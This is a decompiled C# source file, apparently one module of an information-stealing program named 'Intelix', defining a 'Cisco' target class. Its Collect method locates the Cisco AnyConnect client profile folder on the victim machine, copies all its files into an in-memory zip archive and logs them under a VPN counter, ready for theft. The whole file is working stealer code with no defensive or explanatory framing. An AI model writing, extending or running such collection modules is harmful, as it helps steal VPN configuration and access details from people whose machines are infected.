using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000007 RID: 7
	public class Cisco : ITarget
	{
		// Token: 0x06000020 RID: 32 RVA: 0x00002868 File Offset: 0x00000A68
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Cisco", "Cisco AnyConnect Secure Mobility Client", "Profile");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "Cisco";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Cisco AnyConnect";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
